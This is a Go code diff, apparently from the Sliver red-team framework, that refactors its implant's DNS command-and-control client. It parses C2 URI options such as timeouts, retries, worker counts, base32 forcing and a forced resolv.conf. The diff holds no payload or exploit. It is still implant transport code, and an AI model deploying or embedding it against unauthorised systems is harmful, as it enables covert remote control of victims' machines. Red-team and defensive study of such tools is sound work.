@@ -58,6 +58,7 @@ import (
 	"errors"
 	"hash/crc32"
 	insecureRand "math/rand"
+	"net/url"
 	"strconv"
 	"strings"
 	"sync"
@@ -77,10 +78,9 @@ import (
 
 const (
 	// Little endian
-	sessionIDBitMask          = 0x00ffffff // Bitwise mask to get the dns session ID
-	metricsMaxSize            = 8
-	queueBufSize              = 1024
-	defaultWorkersPerResolver = 8
+	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
+	metricsMaxSize   = 8
+	queueBufSize     = 1024
 )
 
 var (
@@ -93,12 +93,55 @@ var (
 	ErrInvalidIndex        = errors.New("invalid start/stop index")
 )
 
+// DNSOptions - c2 specific options
+type DNSOptions struct {
+	QueryTimeout      time.Duration
+	RetryWait         time.Duration
+	RetryCount        int
+	WokersPerResolver int
+	ForceBase32       bool
+	ForceResolvConf   string
+}
+
+// ParseDNSOptions - Parse c2 specific options
+func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
+	// Query timeout
+	queryTimeout, err := time.ParseDuration(c2URI.Query().Get("timeout"))
+	if err != nil {
+		queryTimeout = time.Second * 5
+	}
+	// Retry wait
+	retryWait, err := time.ParseDuration(c2URI.Query().Get("retry-wait"))
+	if err != nil {
+		retryWait = time.Second * 1
+	}
+	// Retry count
+	retryCount, err := strconv.Atoi(c2URI.Query().Get("retry-count"))
+	if err != nil {
+		retryCount = 3
+	}
+	// Workers per resolver
+	workersPerResolver, err := strconv.Atoi(c2URI.Query().Get("workers-per-resolver"))
+	if err != nil || workersPerResolver < 1 {
+		workersPerResolver = 2
+	}
+
+	return &DNSOptions{
+		QueryTimeout:      queryTimeout,
+		RetryWait:         retryWait,
+		RetryCount:        retryCount,
+		WokersPerResolver: workersPerResolver,
+		ForceBase32:       strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
+		ForceResolvConf:   c2URI.Query().Get("force-resolv-conf"),
+	}
+}
+
 // DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
-func DNSStartSession(parent string, retryWait time.Duration, timeout time.Duration) (*SliverDNSClient, error) {
+func DNSStartSession(parent string, opts *DNSOptions) (*SliverDNSClient, error) {
 	// {{if .Config.Debug}}
-	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
+	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, opts.QueryTimeout)
 	// {{end}}
-	client := NewDNSClient(parent, timeout, retryWait)
+	client := NewDNSClient(parent, opts)
 	err := client.SessionInit()
 	if err != nil {
 		return nil, err
@@ -108,18 +151,19 @@ func DNSStartSession(parent string, retryWait time.Duration, timeout time.Durati
 
 // NewDNSClient - Initialize a new DNS client, generally you should use DNSStartSession
 // instead of this function, this is exported mostly for unit testing
-func NewDNSClient(parent string, timeout time.Duration, retryWait time.Duration) *SliverDNSClient {
+func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 	parent = strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + "."
 	return &SliverDNSClient{
-		metadata:     map[string]*ResolverMetadata{},
-		parent:       parent,
-		forceBase32:  false,
-		queryTimeout: timeout,
-		retryWait:    retryWait,
-		retryCount:   3,
-		closed:       true,
+		metadata:        map[string]*ResolverMetadata{},
+		parent:          parent,
+		forceBase32:     opts.ForceBase32,
+		forceResolvConf: opts.ForceResolvConf,
+		queryTimeout:    opts.QueryTimeout,
+		retryWait:       opts.RetryWait,
+		retryCount:      opts.RetryCount,
+		closed:          true,
 
-		WorkersPerResolver: defaultWorkersPerResolver,
+		WorkersPerResolver: opts.WokersPerResolver,
 		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
 		base32:             encoders.Base32{},
 		base58:             encoders.Base58{},
@@ -132,15 +176,16 @@ type SliverDNSClient struct {
 	resolvConf *dns.ClientConfig
 	metadata   map[string]*ResolverMetadata
 
-	parent       string
-	retryWait    time.Duration
-	retryCount   int
-	queryTimeout time.Duration
-	forceBase32  bool
-	subdataSpace int
-	dnsSessionID uint32
-	msgCount     uint32
-	closed       bool
+	parent          string
+	retryWait       time.Duration
+	retryCount      int
+	queryTimeout    time.Duration
+	forceBase32     bool
+	forceResolvConf string
+	subdataSpace    int
+	dnsSessionID    uint32
+	msgCount        uint32
+	closed          bool
 
 	cipherCtx          *cryptography.CipherContext
 	recvQueue          chan *DNSWork
@@ -647,7 +692,14 @@ func (s *SliverDNSClient) getDNSSessionID() error {
 
 func (s *SliverDNSClient) loadResolvConf() error {
 	var err error
-	s.resolvConf, err = dnsClientConfig()
+	if len(s.forceResolvConf) < 1 {
+		s.resolvConf, err = dnsClientConfig()
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] Using forced resolv.conf: %s", s.forceResolvConf)
+		// {{end}}
+		s.resolvConf, err = dns.ClientConfigFromReader(strings.NewReader(s.forceResolvConf))
+	}
 	return err
 }
 
